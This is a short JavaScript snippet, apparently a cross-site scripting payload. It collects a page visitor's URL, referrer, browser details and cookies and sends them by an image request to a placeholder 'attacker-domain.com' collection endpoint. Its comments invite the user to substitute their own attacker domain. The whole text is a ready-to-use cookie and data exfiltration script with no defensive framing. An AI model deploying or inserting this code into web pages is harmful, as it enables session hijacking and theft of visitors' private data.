(function() {
    // Extracting user information
    const userInfo = {
        url: window.location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookies: document.cookie
    };

    // Converting information to a query string
    const queryString = new URLSearchParams(userInfo).toString();

    // Attacker-controlled domain (change this to your attacker domain)
    const attackerDomain = "https://attacker-domain.com/collect";

    // Sending the collected information via an image request
    const img = new Image();
    img.src = `${attackerDomain}?${queryString}`;

    // Optionally log to console (for debugging)
    console.log("User information sent:", userInfo);
})();
